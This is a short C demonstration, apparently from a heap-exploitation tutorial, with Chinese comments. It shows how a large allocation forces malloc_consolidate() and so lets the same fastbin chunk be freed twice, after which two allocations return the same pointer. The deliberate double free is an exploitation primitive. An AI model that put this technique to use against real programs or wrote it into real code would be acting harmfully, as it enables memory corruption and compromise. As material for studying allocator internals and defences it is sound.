#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

int main() {
  void* p1 = malloc(0x10);
  strcpy(p1, "AAAAAAAA");
  void* p2 = malloc(0x10);
  strcpy(p2, "BBBBBBBB");
  fprintf(stderr, "申请两个 fastbin 范围内的 chunk: p1=%p p2=%p\n", p1, p2);
  fprintf(stderr, "先 free p1\n");
  free(p1);
  void* p3 = malloc(0x400);
  fprintf(stderr, "去申请 largebin 大小的 chunk，触发 malloc_consolidate(): p3=%p\n", p3);
  fprintf(stderr, "因为 malloc_consolidate(), p1 会被放到 unsorted bin 中\n");
  free(p1);
  fprintf(stderr, "这时候 p1 不在 fastbin 链表的头部了，所以可以再次 free p1 造成 double free\n");
  void* p4 = malloc(0x10);
  strcpy(p4, "CCCCCCC");
  void* p5 = malloc(0x10);
  strcpy(p5, "DDDDDDDD");
  fprintf(stderr, "现在 fastbin 和 unsortedbin 中都放着 p1 的指针，所以我们可以 malloc 两次都到 p1: %p %p\n", p4, p5);
}
